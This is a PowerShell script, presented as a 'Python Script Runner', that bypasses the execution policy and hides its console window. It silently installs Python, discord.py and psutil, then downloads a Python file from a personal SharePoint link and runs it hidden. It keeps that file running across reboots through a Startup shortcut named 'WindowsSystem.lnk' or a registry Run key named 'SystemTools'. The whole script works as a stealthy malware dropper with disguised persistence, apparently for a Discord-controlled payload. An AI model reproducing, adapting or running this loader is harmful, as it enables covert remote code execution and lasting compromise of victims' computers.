# Python Script Runner with Startup Persistence - Windows 10/11 Compatible
# Save as .ps1 file and run

# Bypass execution policy for Windows 10 compatibility
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue

# Simple window hiding that works on all Windows versions
try {
    $signature = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@
    $type = Add-Type -MemberDefinition $signature -Name "Win32" -Namespace Win32Functions -PassThru
    $consolePtr = $type::GetConsoleWindow()
    $type::ShowWindow($consolePtr, 0)  # 0 = hide window
} catch {
    # Continue silently if hiding fails
}

# Function to check if Python is installed - FIXED FOR WIN10
function Test-Python {
    try {
        # Method 1: Try python command directly
        $null = Get-Command python -ErrorAction Stop
        return $true
    } catch {
        try {
            # Method 2: Try python3 command
            $null = Get-Command python3 -ErrorAction Stop
            return $true
        } catch {
            # Method 3: Try running python --version
            try {
                $result = cmd /c "python --version 2>&1"
                if ($LASTEXITCODE -eq 0) {
                    return $true
                }
            } catch {
                # Continue to next check
            }
        }
    }
    return $false
}

# Function to install Python silently - FIXED FOR WIN10
function Install-Python {
    Write-Host "Installing Python..." -ForegroundColor Yellow
    
    # Use full Python installer for better Windows 10 compatibility
    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
    $installerPath = "$env:TEMP\python_installer.exe"
    
    try {
        # Download Python installer - multiple methods for compatibility
        Write-Host "Downloading Python installer..." -ForegroundColor Yellow
        try {
            Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -UseBasicParsing
        } catch {
            # Fallback download method for Windows 10
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($pythonUrl, $installerPath)
        }
        
        # Install Python for current user only (no admin required)
        Write-Host "Installing Python silently..." -ForegroundColor Yellow
        $process = Start-Process -FilePath $installerPath -ArgumentList @(
            "/quiet",
            "InstallAllUsers=0",
            "PrependPath=1",
            "Include_test=0",
            "Include_pip=1",
            "Include_launcher=0",
            "SimpleInstall=1"
        ) -Wait -PassThru -WindowStyle Hidden
        
        if ($process.ExitCode -eq 0) {
            Write-Host "Python installed successfully" -ForegroundColor Green
            
            # Wait for installation to complete and PATH to update
            Start-Sleep -Seconds 8
            
            # Refresh environment to recognize Python in PATH
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
            
            return $true
        } else {
            Write-Host "Python installer failed with exit code: $($process.ExitCode)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "Failed to install Python: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to install pip and dependencies - FIXED FOR WIN10
function Install-Deps {
    Write-Host "Installing dependencies..." -ForegroundColor Yellow
    
    # Install required packages with multiple methods
    $packages = @("discord.py", "psutil")
    
    foreach ($pkg in $packages) {
        Write-Host "Installing $pkg..." -ForegroundColor Yellow
        
        # Method 1: Using pip directly
        try {
            $process = Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", $pkg, "--quiet", "--user" -Wait -PassThru -WindowStyle Hidden
            if ($process.ExitCode -eq 0) {
                Write-Host "✓ $pkg installed successfully" -ForegroundColor Green
                continue
            }
        } catch {
            # Continue to next method
        }
        
        # Method 2: Using pip with different options
        try {
            $process = Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", $pkg, "--user", "--no-warn-script-location" -Wait -PassThru -WindowStyle Hidden
            if ($process.ExitCode -eq 0) {
                Write-Host "✓ $pkg installed successfully" -ForegroundColor Green
                continue
            }
        } catch {
            # Package installation failed
        }
        
        Write-Host "⚠ Could not install $pkg, but continuing..." -ForegroundColor Yellow
    }
}

# Function to add to startup (works on Win 10/11) - UNCHANGED
function Add-Startup {
    param($PythonCmd, $ScriptPath)
    
    Write-Host "Setting up startup persistence..." -ForegroundColor Yellow
    
    # Method 1: Startup folder (most reliable, no admin needed)
    try {
        $startupPath = [Environment]::GetFolderPath("Startup")
        $shortcutPath = "$startupPath\WindowsSystem.lnk"
        
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut($shortcutPath)
        $Shortcut.TargetPath = "cmd.exe"
        $Shortcut.Arguments = "/c `"$PythonCmd` `"$ScriptPath`""
        $Shortcut.WindowStyle = 7  # Minimized
        $Shortcut.WorkingDirectory = "$env:USERPROFILE"
        $Shortcut.Save()
        Write-Host "✓ Startup shortcut created successfully" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Startup folder method failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Method 2: Registry (fallback)
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "SystemTools"
        $regValue = "cmd.exe /c `"$PythonCmd` `"$ScriptPath`""
        
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
        Write-Host "✓ Registry startup entry added" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Registry method failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return $false
}

# Main execution - FIXED BRACE STRUCTURE
try {
    # Check if Python is available
    if (Test-Python) {
        Write-Host "✓ Python found on system" -ForegroundColor Green
        $pythonCmd = "python"
    } else {
        Write-Host "Python not found, installing..." -ForegroundColor Yellow
        $pythonInstalled = Install-Python
        
        if (-not $pythonInstalled) {
            Write-Host "❌ Python installation failed!" -ForegroundColor Red
            exit 1
        }
        
        # Verify Python works after installation
        if (-not (Test-Python)) {
            Write-Host "❌ Python not found after installation!" -ForegroundColor Red
            exit 1
        }
        
        Write-Host "✓ Python installed successfully" -ForegroundColor Green
        $pythonCmd = "python"
    }
    
    # Install dependencies
    Install-Deps
    
    # Download the main script
    Write-Host "Downloading main script..." -ForegroundColor Yellow
    
    $scriptUrl = "https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=PanmFy&download=1"
    $scriptPath = "$env:USERPROFILE\ProcessManager.py"
    
    # Download the script with multiple methods
    try {
        Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing
        Write-Host "✓ Script downloaded to: $scriptPath" -ForegroundColor Green
    } catch {
        try {
            # Fallback download method for Windows 10
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($scriptUrl, $scriptPath)
            Write-Host "✓ Script downloaded to: $scriptPath" -ForegroundColor Green
        } catch {
            Write-Host "❌ Failed to download script: $($_.Exception.Message)" -ForegroundColor Red
            exit 1
        }
    }
    
    if (Test-Path $scriptPath) {
        Write-Host "Running script..." -ForegroundColor Green
        
        # Test if Python command works
        try {
            $testProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "$pythonCmd --version" -Wait -PassThru -WindowStyle Hidden
            if ($testProcess.ExitCode -eq 0) {
                # Run the script hidden
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "$pythonCmd `"$scriptPath`" & exit" -WindowStyle Hidden
                Write-Host "✓ Script started successfully!" -ForegroundColor Green
                
                # Add to startup
                if (Add-Startup -PythonCmd $pythonCmd -ScriptPath $scriptPath) {
                    Write-Host "✓ Startup persistence configured!" -ForegroundColor Green
                } else {
                    Write-Host "⚠ Failed to configure startup, but script is running" -ForegroundColor Yellow
                }
            } else {
                Write-Host "❌ Python command failed, cannot run script" -ForegroundColor Red
            }
        } catch {
            Write-Host "❌ Failed to run script: $($_.Exception.Message)" -ForegroundColor Red
        }
    } else {
        Write-Host "❌ Script file not found after download" -ForegroundColor Red
    }
} catch {
    Write-Host "❌ Unexpected error: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "Setup completed!" -ForegroundColor Green
Start-Sleep -Seconds 5
